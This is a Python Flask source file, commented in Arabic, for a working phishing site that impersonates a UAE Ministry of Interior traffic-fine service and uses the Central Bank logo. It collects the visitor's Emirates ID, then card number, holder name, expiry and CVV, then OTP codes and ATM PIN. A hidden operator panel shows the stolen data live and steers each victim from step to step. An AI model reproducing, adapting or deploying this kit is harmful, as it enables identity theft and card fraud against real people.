import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# قاعدة بيانات حية للتحكم في حالة العميل والرسائل
db = {"logs": [], "status": "waiting", "msg": ""}

# الهيدر الحكومي الثابت
HEADER = '<div style="position:sticky; top:0; z-index:1000; background:white; border-bottom:1px solid #ddd; width:100%;"><img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" style="width:100%; display:block;"></div>'

# --- 1. الصفحة الرئيسية (الـ 8 صور كاملة بدون نقص) ---
HOME_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body, html {{ margin:0; padding:0; background:#f4f4f4; font-family: sans-serif; }}
    .page {{ max-width:650px; margin:0 auto; background:white; position:relative; box-shadow:0 0 20px rgba(0,0,0,0.1); }}
    img {{ width:100%; display:block; }}
    .btn-hidden {{ position:absolute; left:10%; width:80%; height:55px; background:transparent; border:none; cursor:pointer; z-index:10; }}
</style>
</head>
<body>
    {HEADER}
    <div class="page">
        <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
        <button class="btn-hidden" style="top:270px;" onclick="location.href='/search'"></button>
        <button class="btn-hidden" style="top:325px;" onclick="location.href='/search'"></button>
        <img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_dc754b0143e14766a16919be2a1ee249~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_0596c91fd65d49a9b3598f7d4ff5a811~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_1347280275a14cada9eef8982ee5a375~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_662e4c074fe94f80940882c18cd51a87~mv2.jpg">
    </div>
</body>
</html>
"""

# --- 2. صفحة الاستعلام (نسخة MOI الشاملة لكل الخيارات) ---
SEARCH_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body {{ background:#f7f8fa; margin:0; font-family: 'Segoe UI', sans-serif; }}
    .moi-card {{ background:white; width:92%; max-width:850px; margin:40px auto; border-radius:8px; box-shadow:0 5px 20px rgba(0,0,0,0.05); overflow:hidden; }}
    .moi-title {{ background:#23395d; color:white; padding:20px; font-size:18px; display:flex; justify-content:space-between; align-items:center; }}
    .moi-body {{ padding:35px; }}
    .tabs-row {{ display:flex; border-bottom:1px solid #eee; margin-bottom:25px; gap:20px; }}
    .tab {{ padding:10px; color:#777; font-weight:bold; border-bottom:4px solid transparent; cursor:pointer; }}
    .tab.active {{ color:#b0914f; border-bottom-color:#b0914f; }}
    label {{ display:block; margin-bottom:8px; font-weight:bold; font-size:14px; color:#333; }}
    select, input {{ width:100%; padding:14px; margin-bottom:20px; border:1px solid #ddd; border-radius:4px; font-size:15px; box-sizing:border-box; background:#fdfdfd; }}
    .grid-moi {{ display:grid; grid-template-columns: 1.2fr 0.8fr 2fr; gap:15px; }}
    .btn-search {{ background:#b0914f; color:white; padding:15px 45px; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer; float:left; transition:0.3s; }}
</style></head>
<body>
    {HEADER}
    <div class="moi-card">
        <div class="moi-title"><span>الاستعلام عن المخالفات المرورية</span><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" height="35"></div>
        <div class="moi-body">
            <div class="tabs-row"><div class="tab active">بيانات اللوحة</div><div class="tab">الرمز المروري</div><div class="tab">بيانات الرخصة</div></div>
            <form action="/checkout" method="GET">
                <label>إمارة مصدر اللوحة / Plate Source</label>
                <select name="emirate">
                    <option>أبوظبي / Abu Dhabi</option><option>دبي / Dubai</option><option>الشارقة / Sharjah</option>
                    <option>عجمان / Ajman</option><option>أم القيوين / Umm Al Quwain</option><option>رأس الخيمة / Ras Al Khaimah</option><option>الفجيرة / Fujairah</option>
                </select>
                <div class="grid-moi">
                    <div><label>نوع اللوحة</label><select name="type">
                        <option>خصوصي</option><option>نقل عام</option><option>تجاري</option><option>قنصلية</option><option>تصدير</option><option>دراجة</option>
                    </select></div>
                    <div><label>الرمز</label><input type="text" placeholder="1"></div>
                    <div><label>رقم اللوحة</label><input type="text" placeholder="12345"></div>
                </div>
                <label>رقم الهوية الإماراتية / Emirates ID</label>
                <input type="text" placeholder="784-XXXX-XXXXXXX-X" required>
                <div style="overflow:hidden;"><button type="submit" class="btn-search">استعلام / Search</button></div>
            </form>
        </div>
    </div>
</body>
</html>
"""

# --- 3. بوابة الدفع (التصميم البنكي الفخم) ---
PAY_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body {{ background:#eaebed; font-family:sans-serif; margin:0; }}
    .pay-card {{ max-width:480px; margin:40px auto; background:white; padding:35px; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,0.1); border:1px solid #ddd; }}
    .amt-box {{ background:#f8f9fa; border:1px dashed #b0914f; padding:15px; text-align:center; border-radius:8px; margin-bottom:25px; color:#2c3e50; }}
    input {{ width:100%; padding:15px; margin:10px 0; border:1px solid #ccc; border-radius:6px; font-size:16px; box-sizing:border-box; }}
    .btn-pay {{ width:100%; padding:18px; background:#2c3e50; color:white; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer; margin-top:15px; }}
</style></head>
<body>
    {HEADER}
    <div class="pay-card">
        <div style="text-align:center; margin-bottom:20px;"><img src="https://upload.wikimedia.org/wikipedia/commons/0/03/Central_Bank_of_the_United_Arab_Emirates_logo.png" height="55"></div>
        <div class="amt-box">إجمالي الغرامات المستحقة: <br><strong style="font-size:24px;">255.00 AED</strong></div>
        <form action="/submit-card" method="POST">
            <input type="text" name="holder" placeholder="اسم حامل البطاقة" required>
            <input type="text" id="cn" name="card" placeholder="رقم البطاقة (16 رقم)" maxlength="19" required>
            <div style="display:flex; gap:10px;"><input name="exp" placeholder="MM/YY"><input name="cvv" placeholder="CVV"></div>
            <button type="submit" class="btn-pay">دفع آمن الآن</button>
        </form>
    </div>
    <script>document.getElementById('cn').addEventListener('input',e=>{{e.target.value=e.target.value.replace(/\\s/g,'').replace(/(.{{4}})/g,'$1 ').trim();}});</script>
</body>
</html>
"""

# --- 4. لوحة التحكم (التصميم اللي طلبته: كارت + قبول ورفض مخصص) ---
ADMIN_HTML = """
<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><style>
    body{background:#000; color:#fff; font-family:sans-serif; padding:20px;}
    .log-box{background:#111; border:1px solid #444; padding:25px; border-radius:15px; margin-bottom:30px;}
    .bank-card{background:linear-gradient(135deg, #0f2027, #203a43, #2c5364); width:350px; padding:25px; border-radius:15px; margin-bottom:20px; border:1px solid gold;}
    .card-num{font-size:22px; letter-spacing:2px; font-family:monospace; margin:15px 0;}
    .controls{background:#222; padding:15px; border-radius:10px;}
    .btn{padding:10px 15px; border:none; border-radius:5px; cursor:pointer; font-weight:bold; color:#fff; margin:5px;}
    .btn-ok{background:#27ae60;} .btn-no{background:#c0392b;}
</style></head>
<body>
    <h1>لوحة الصياد - تحكم كامل 👮‍♂️</h1>
    <div id="logs"></div>
    <audio id="notif" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg"></audio>
    <script>
        function load(){
            fetch('/get-logs').then(r=>r.json()).then(data=>{
                let h = '';
                data.logs.forEach(l=>{
                    h += `<div class="log-box">
                        <div class="bank-card">
                            <div style="color:gold; font-weight:bold;">VISA / MASTERCARD</div>
                            <div class="card-num">${l.card || '****'}</div>
                            <div style="display:flex; justify-content:space-between;"><span>${l.holder}</span><span>${l.exp}</span></div>
                            <div style="margin-top:10px; color:#00ff00;">CVV: ${l.cvv} | OTP: ${l.otp || '---'} | PIN: ${l.pin || '---'}</div>
                        </div>
                        <div class="controls">
                            <b>التحكم في العميل:</b><br>
                            <button class="btn btn-ok" onclick="act('go_otp', '')">قبول البطاقة (اطلب OTP)</button>
                            <button class="btn btn-no" onclick="act('error_card', 'برجاء التأكد من معلومات البطاقة')">رفض البطاقة (بيانات خطأ)</button>
                            <hr>
                            <button class="btn btn-ok" onclick="act('go_pin', '')">قبول OTP (اطلب PIN الصراف)</button>
                            <button class="btn btn-no" onclick="act('go_otp', 'برجاء التأكد من الرمز المرسل للجوال')">رفض OTP (اطلب الكود تاني)</button>
                        </div>
                    </div>`;
                });
                if(document.getElementById('logs').innerHTML !== h){
                    document.getElementById('logs').innerHTML = h; document.getElementById('notif').play();
                }
            });
        }
        function act(s, m){ fetch('/set-status/'+s+'?msg='+m); }
        setInterval(load, 3000);
    </script>
</body></html>
"""

# --- السيرفر (Back-end) ---
@app.route('/')
def index(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML)

@app.route('/checkout')
def checkout(): return render_template_string(PAY_HTML)

@app.route('/h-admin')
def admin(): return render_template_string(ADMIN_HTML)

@app.route('/submit-card', methods=['POST'])
def sub():
    db['logs'].insert(0, request.form.to_dict())
    db['status'] = 'waiting'
    return render_template_string(WAIT_JS)

@app.route('/get-logs')
def get_logs(): return jsonify({"logs": db['logs']})

@app.route('/set-status/<s>')
def set_s(s):
    db['status'] = s
    db['msg'] = request.args.get('msg', '')
    return "OK"

@app.route('/check-status')
def check_s(): return jsonify({"status": db['status'], "msg": db['msg']})

WAIT_JS = """
<script>
    setInterval(() => {
        fetch('/check-status').then(r => r.json()).then(d => {
            if(d.status === 'go_otp') location.href='/otp';
            if(d.status === 'go_pin') location.href='/pin';
            if(d.status === 'error_card') { alert(d.msg); location.href='/checkout'; }
        });
    }, 3000);
</script>
<body style="text-align:center;padding-top:100px;background:#f4f4f4;font-family:sans-serif;">
    <div style="border:5px solid #ccc; border-top:5px solid #b0914f; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:auto;"></div>
    <h2>جاري مراجعة الطلب مع البنك...</h2>
    <style>@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }</style>
</body>
"""

@app.route('/otp')
def otp(): return render_template_string(f"<html><body style='text-align:center;padding:50px;font-family:sans-serif;'>{HEADER}<h2>تأكيد الرمز (OTP)</h2><p>أدخل الكود المكون من 6 أرقام</p><form action='/submit-card' method='POST'><input name='otp' style='font-size:24px;text-align:center;' maxlength='6'><br><br><button type='submit'>تأكيد</button></form></body></html>")

@app.route('/pin')
def pin(): return render_template_string(f"<html><body style='text-align:center;padding:50px;font-family:sans-serif;'>{HEADER}<h2>الرقم السري ATM</h2><p>أدخل الرقم السري للبطاقة</p><form action='/submit-card' method='POST'><input name='pin' type='password' style='font-size:24px;text-align:center;' maxlength='4'><br><br><button type='submit'>إرسال</button></form></body></html>")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
